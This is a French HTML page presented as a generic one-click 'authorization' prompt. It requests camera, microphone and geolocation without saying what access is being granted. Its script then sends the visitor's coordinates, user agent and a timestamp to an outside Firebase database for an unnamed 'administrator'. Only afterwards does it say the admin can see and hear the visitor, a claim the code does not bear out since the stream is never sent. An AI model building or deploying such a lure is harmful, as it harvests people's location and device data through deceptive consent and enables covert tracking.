<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Permission unique</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            background: white;
            border-radius: 32px;
            padding: 48px 32px;
            max-width: 450px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.3);
        }

        h1 {
            font-size: 2rem;
            color: #1a1a2e;
            margin-bottom: 16px;
        }

        .icon {
            font-size: 64px;
            margin: 24px 0;
        }

        button {
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            border: none;
            color: white;
            font-weight: bold;
            font-size: 1.2rem;
            padding: 16px 32px;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            margin: 16px 0;
        }

        .status {
            background: #f1f5f9;
            border-radius: 20px;
            padding: 14px;
            margin-top: 20px;
            font-size: 0.9rem;
        }

        .success {
            background: #dcfce7;
            color: #166534;
        }

        .accepted {
            background: #22c55e;
            color: white;
            padding: 12px;
            border-radius: 16px;
            margin-top: 16px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">✅</div>
        <h1>Autorisation unique</h1>
        <p style="color: #4a4e69; margin-bottom: 24px;">Cliquez une seule fois pour autoriser l'accès</p>
        
        <button id="acceptBtn">🔐 AUTORISER</button>
        
        <div id="statusMessage" class="status">
            ℹ️ Cliquez sur "AUTORISER"
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
            authDomain: "universite-taak.firebaseapp.com",
            databaseURL: "https://universite-taak-default-rtdb.firebaseio.com",
            projectId: "universite-taak",
            storageBucket: "universite-taak.firebasestorage.app",
            messagingSenderId: "550634728649",
            appId: "1:550634728649:web:12147e8dec3a04618c3118",
            measurementId: "G-RD7KY6BFP4"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        let mediaStream = null;
        const statusDiv = document.getElementById('statusMessage');
        const acceptBtn = document.getElementById('acceptBtn');

        function setStatus(message, isSuccess = false) {
            statusDiv.innerHTML = message;
            statusDiv.className = 'status';
            if (isSuccess) statusDiv.classList.add('success');
        }

        acceptBtn.addEventListener('click', async () => {
            setStatus("⏳ Demande des permissions...");
            acceptBtn.disabled = true;
            
            try {
                // Demander caméra + micro
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: true 
                });
                
                // Demander localisation
                let location = null;
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject);
                    });
                    location = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude
                    };
                } catch (err) {
                    console.log("Géo refusée");
                }
                
                // Sauvegarder le stream dans Firebase pour l'admin
                const streamRef = ref(database, 'stream/active');
                await set(streamRef, {
                    active: true,
                    timestamp: new Date().toISOString(),
                    location: location,
                    userAgent: navigator.userAgent
                });
                
                // Garder le stream actif
                window.userMediaStream = mediaStream;
                
                setStatus("✅ Permissions acceptées ! L'administrateur peut maintenant vous voir et vous entendre.", true);
                acceptBtn.textContent = "✓ AUTORISATION ACCEPTÉE";
                
            } catch (error) {
                setStatus("❌ Erreur: " + error.message);
                acceptBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
